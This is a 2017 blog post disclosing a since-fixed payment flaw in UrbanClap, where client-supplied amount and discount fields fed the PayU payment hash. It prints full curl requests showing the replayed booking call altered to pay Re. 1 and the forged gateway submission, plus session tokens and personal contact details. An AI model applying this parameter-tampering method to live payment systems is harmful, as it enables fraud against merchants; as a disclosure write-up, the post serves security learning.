---
layout: post
title: Unlimited free services (Courtsey UrbanClap)
date: '2017-07-08T11:45:00.001-07:00'
author: Udit
tags:
- vulnerability
- security
- payment
- UnlimitedFree
- Urbanclap
modified_time: '2018-02-14T02:54:07.001-08:00'
thumbnail: https://3.bp.blogspot.com/-LmolgV5jcrk/WWEiyjeCbMI/AAAAAAAAKjI/flRdp4DbPOEXG9pM3TCL8X6QQhzqeqfhACEwYBhgL/s72-c/uc1.png
---

<div dir="ltr" style="text-align: left;" trbidi="on"><div dir="ltr" style="text-align: left;" trbidi="on">There is a line from a famous poem "<a href="https://en.wikipedia.org/wiki/The_Rime_of_the_Ancient_Mariner">The Rime of Ancient Mariner</a>":<br /><blockquote class="tr_bq">"<span style="background-color: white; color: #222222; font-family: sans-serif; font-size: 14px;">Water, water, every where,&nbsp;</span><span style="background-color: white; color: #222222; font-family: sans-serif; font-size: 14px;">Nor any drop to drink</span>"</blockquote>Similarly, &nbsp;we are having the same thing going on with startups these days:<br /><blockquote class="tr_bq">"Startups Startups every where, Nor any drop of SECURITY"</blockquote>Yes, this is very unfortunate but it is true indeed. Everyone out there just want to build a startup but no one thinks about the security parameters they should put in their tech stack.<br /><br />This time it is <a href="https://www.urbanclap.com/">UrbanClap</a>.&nbsp;UrbanClap is a services marketplace aimed at the Indian market, whose purpose is to connect service professionals with customers.<br /><br />Note: The issue/bug has already been fixed by the company.<br /><br /><h3 style="text-align: left;">Vulnerability:</h3>I was able to avail paid services from their platform without actually paying anything. They had a vulnerability in their payment gateway which I exploited.<br /><br />I was just booking a service on their platform and while doing that, I was discussing a vulnerability in payment system of another website with a friend. He was sitting with me and just out of curiosity I said may be there is some vulnerability with urbanclap too. My friend said no. He said urbanclap is a big company. They must have proper integration of payment gateway. So, I thought of seeing what all API calls they make to figure out whether they have any vulnerability there. Here is the detailed explanation of the process I took:<br /><h4 style="text-align: left;"><b>Step 1:</b></h4>After submitting all the details and clicking on "Proceed to Pay" button on their website, I found out they make a request to "https://www.urbanclap.com/api/v1/customerrequests/createRequestWithPg/11" to actually add the transaction in their system:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-LmolgV5jcrk/WWEiyjeCbMI/AAAAAAAAKjI/flRdp4DbPOEXG9pM3TCL8X6QQhzqeqfhACEwYBhgL/s1600/uc1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="722" data-original-width="1600" height="288" src="https://3.bp.blogspot.com/-LmolgV5jcrk/WWEiyjeCbMI/AAAAAAAAKjI/flRdp4DbPOEXG9pM3TCL8X6QQhzqeqfhACEwYBhgL/s640/uc1.png" width="640" /></a></div><h4 style="text-align: left;"><b>Step 2:</b></h4>On digging more, I was able to figure out that the same call generates the hash to be given to the payment gateway. All the security of the payment integration actually lies with "hash". This API call in curl format looks like following:<br /><br /></div><code>curl 'https://www.urbanclap.com/api/v1/customerrequests/createRequestWithPg/11' -H 'origin: https://www.urbanclap.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.8' -H 'authorization: Bearer 57a5a648d08ea72cce1f549a|41d2e53573259e4fd1012daafaaf7729731c565d80c0275659862fe02a4ef0926bd22b719e42daeae3a323e17db6e87c0016504f77cf0fddd36338798bdc2e39' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' -H 'referer: https://www.urbanclap.com/delhi-ncr' --data-binary '{"customer_request":{"city_key":"city_delhi_v2","customer_category_key":"spa_at_home","is_enable_fast_booking_flow":false,"call_back":true,"device":"desktop_web","device_id":"ucu6eebc-9769c8a32f-9133-bd6b-818a-0b8c6f7b32-1493502519545","app_version":"web_v2.9.3","app_version_no":"2.9.3","questions_details":[{"question_tag":"delhi-spa_at_home-873e2eb7","meta_data":{"answer_tags":["spa_at_home-ef2e1adb"]}},{"question_tag":"delhi-spa_at_home-c9392492","meta_data":{"answer_tags":["spa_at_home-895d081c"]}},{"question_tag":"delhi-spa_at_home-90e8a12b","meta_data":{"answer_tags":["spa_at_home-cb82beb1"]}},{"question_tag":"delhi-spa_at_home-6b8db204","meta_data":{"landmark":"Near St. Stephens Hospital","booking_end_time":"2017-01-29T13:30:00.000Z","booking_time":"2017-05-21T12:30:00.000Z","lat":28.4916812,"long":77.09489699999995,"location_key":"sub_city_gurgaon_v2","description":"DLF Phase 3, Gurugram, Haryana, India","place_id":"ChIJo0wVSMseDTkRIozPBFkQJ5g","location":"Room 5, 31C/15, S Block"}}],"category_questions_id":"6ec17e95-e72b-4a6b-bcc0-b35e0c4b930d","user_type":"general",<span style="background-color: #ffe599;">"paid_amount":2299</span>,"uc_credits":0,"uc_cash":0,"coupon_code":"","utm_params":{"utm_campaign":null,"utm_content":null,"utm_medium":null,"utm_source":"direct","utm_term":null,"user_landing":"homepage","user_new":0},"booking_type":"normal","booking_price_total":2299,"cod_amount":2299,"name":"udit agarwal","email":"uditiiita@gmail.com","phone":"+91 9411656264","user_id":"57a5a648d08ea72cce1f549a","budget":2299,<span style="background-color: #ffe599;">"discount":0,"coupon_discount":""</span>,"pre_request_mode":"online","payment_method":"wallet","is_genuine":false}}' --compressed </code><br /><br />Here, note that in this API call, they were sending amount and discount values as the parameters which is the actual vulnerability.<br /><h4 style="text-align: left;"><b>Step 3:</b></h4>I replayed this request with changed values of "paid_amount", "discount" and "coupon_discount". Like following:<br /><br /><code>curl 'https://www.urbanclap.com/api/v1/customerrequests/createRequestWithPg/11' -H 'origin: https://www.urbanclap.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.8' -H 'authorization: Bearer 57a5a648d08ea72cce1f549a|41d2e53573259e4fd1012daafaaf7729731c565d80c0275659862fe02a4ef0926bd22b719e42daeae3a323e17db6e87c0016504f77cf0fddd36338798bdc2e39' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' -H 'referer: https://www.urbanclap.com/delhi-ncr' --data-binary '{"customer_request":{"city_key":"city_delhi_v2","customer_category_key":"spa_at_home","is_enable_fast_booking_flow":false,"call_back":true,"device":"desktop_web","device_id":"ucu6eebc-9769c8a32f-9133-bd6b-818a-0b8c6f7b32-1493502519545","app_version":"web_v2.9.3","app_version_no":"2.9.3","questions_details":[{"question_tag":"delhi-spa_at_home-873e2eb7","meta_data":{"answer_tags":["spa_at_home-ef2e1adb"]}},{"question_tag":"delhi-spa_at_home-c9392492","meta_data":{"answer_tags":["spa_at_home-895d081c"]}},{"question_tag":"delhi-spa_at_home-90e8a12b","meta_data":{"answer_tags":["spa_at_home-cb82beb1"]}},{"question_tag":"delhi-spa_at_home-6b8db204","meta_data":{"landmark":"Near St. Stephens Hospital","booking_end_time":"2017-01-29T13:30:00.000Z","booking_time":"2017-05-21T12:30:00.000Z","lat":28.4916812,"long":77.09489699999995,"location_key":"sub_city_gurgaon_v2","description":"DLF Phase 3, Gurugram, Haryana, India","place_id":"ChIJo0wVSMseDTkRIozPBFkQJ5g","location":"Room 5, 31C/15, S Block"}}],"category_questions_id":"6ec17e95-e72b-4a6b-bcc0-b35e0c4b930d","user_type":"general",<span style="background-color: #ffe599;">"paid_amount":1</span>,"uc_credits":0,"uc_cash":0,"coupon_code":"","utm_params":{"utm_campaign":null,"utm_content":null,"utm_medium":null,"utm_source":"direct","utm_term":null,"user_landing":"homepage","user_new":0},"booking_type":"normal","booking_price_total":2299,"cod_amount":2299,"name":"udit agarwal","email":"uditiiita@gmail.com","phone":"+91 9411656264","user_id":"57a5a648d08ea72cce1f549a","budget":2299,<span style="background-color: #ffe599;">"discount":2298,"coupon_discount":"2298"</span>,"pre_request_mode":"online","payment_method":"wallet","is_genuine":false}}' --compressed</code><br /><h4 style="text-align: left;">Step 4:</h4>I got following as response:<br /><span style="font-family: monospace;"><br /></span><span style="font-family: monospace;">{"isError":false,"success":{"data":{"transaction_id":503025,"payment_hash":"631a6401d3474c397f959fa70de794d72bace5750a4d8e52aa9c0edea6b466a92dab8a93df394a98546b8ad54322eade93e1acb1dcb43a65524f212d195e3591","request_id":"5921592d7796272d2c9aa6a5","paid_amount":1},"message":"Successfully Done!!"}}% &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><br /><div><span style="font-family: monospace;"><br /></span></div>I received a success response along with the hash parameter to be given to the payment gateway to process the payment in the next step.<br /><h4 style="text-align: left;">Step 5:</h4>After generating hash, this website was redirecting user to the payment gateway with hash value and other values like order id, amount etc. So in the last part, I replaced the hash and other parameters in the call to the PayU payment gateway like following:<br /><br /><code>curl 'https://secure.payu.in/_payment' -H 'Cookie: PHPSESSID=tvff64ii59s9fttt2g3ilemrr4; PAYUID=d36b73483720c4f3161b8561e4eb4d7b9fe7be68185a1bd442022e2d498c5202' -H 'Origin: https://www.urbanclap.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: https://www.urbanclap.com/delhi-ncr' -H 'Connection: keep-alive' --data 'key=GmUdL6&amp;<span style="background-color: #ffe599;">amount=1</span>&amp;productinfo=spa_at_home&amp;firstname=udit&amp;lastname=&amp;email=uditiiita@gmail.com&amp;phone=9411656264&amp;hash=<span style="background-color: #ffe599;">631a6401d3474c397f959fa70de794d72bace5750a4d8e52aa9c0edea6b466a92dab8a93df394a98546b8ad54322eade93e1acb1dcb43a65524f212d195e3591</span>&amp;surl=https://www.urbanclap.com/api/v1/paymentGateway/payusurl&amp;furl=https://www.urbanclap.com/api/v1/paymentGateway/payufurl&amp;txnid=503025&amp;pg=NB&amp;bankcode=ICIB&amp;ccnum=&amp;ccname=&amp;ccexpmon=&amp;ccexpyr=&amp;ccvv=&amp;udf1=11&amp;udf2=5921592d7796272d2c9aa6a5' --compressed &gt; ~/a.html</code><br /><h4 style="text-align: left;">Step 6:</h4>Now when I open ~/a.html in web browser, it successfully redirects me to the payment page to make a payment or Re. 1 and when completing that, my booking is done.<br /><br />Here is the screenshot of the booking from their website:<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-3HzDIQJnzhQ/WWEjKvtq9DI/AAAAAAAAKjY/o-WU3B10QnY_147QNIbqdjmqs0Csa48qQCLcBGAs/s1600/Screen%2BShot%2B2017-05-21%2Bat%2B2.41.27%2BPM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="513" data-original-width="1600" height="204" src="https://2.bp.blogspot.com/-3HzDIQJnzhQ/WWEjKvtq9DI/AAAAAAAAKjY/o-WU3B10QnY_147QNIbqdjmqs0Csa48qQCLcBGAs/s640/Screen%2BShot%2B2017-05-21%2Bat%2B2.41.27%2BPM.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-HKJSVSsGN7Y/WWEjKnLnjbI/AAAAAAAAKjU/HXiS3LLRqCY01qY2j8RMc-37vwY2PmybQCLcBGAs/s1600/Screen%2BShot%2B2017-05-21%2Bat%2B2.48.15%2BPM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="692" data-original-width="1600" height="276" src="https://4.bp.blogspot.com/-HKJSVSsGN7Y/WWEjKnLnjbI/AAAAAAAAKjU/HXiS3LLRqCY01qY2j8RMc-37vwY2PmybQCLcBGAs/s640/Screen%2BShot%2B2017-05-21%2Bat%2B2.48.15%2BPM.png" width="640" /></a></div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">As you can see in the above screenshot, I was able to make the booking by just paying Re. 1.</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;"><b>Why did this problem occur?</b></div><div class="separator" style="clear: both; text-align: center;"><br /></div>Relying on data server is receiving from client is the most crucial part where all the game lies. No server side calculations or checks were in place. Whatever the amount was sent in the request, they were used directly for generating payment gateway hash without validating them for their correctness.<br />Sever`hash` is the one which is only validated at the payment gateway's end to check whether any tempering has been done with the request. So, hash value should only be generated only with the correct amount. But over here, I was able to create the payment transaction for my order by changing the amount from Rs. 2299 to Re. 1. This should not be allowed on any website or app.<br /><br />With the existence of so much content online, how can a well established do such a big mistake. It has really become so difficult to build a insecure system today. But somehow by doing a lot of hard work, people still manage to create such insecure systems.<br /><br />Startup like UrbanClap has secured many rounds of funding in millions but still they are not investing anything in the security of their website is alarming.<br /><h3 style="text-align: left;">Doing the good part:</h3><div>When I found this problem, I informed their CEO about this issue. He acknowledged it quickly and ensured that he will get it fixed. They took some time to solve it but finally, they have solved it and it is no more in their website.&nbsp;</div><div>I got 5000 UC credits for this :)</div><br /><hr /><br /><div>Note: To read more posts by me in #UnlimitedFree series, go to&nbsp;<a href="http://blog.uditagarwal.com/search/label/UnlimitedFree">http://blog.uditagarwal.com/search/label/UnlimitedFree</a><br /><br />Thanks for reading this. Please do comment your views on this. Follow me at:&nbsp;<a href="https://twitter.com/anomaly2104">https://twitter.com/anomaly2104</a><br /><br /></div></div>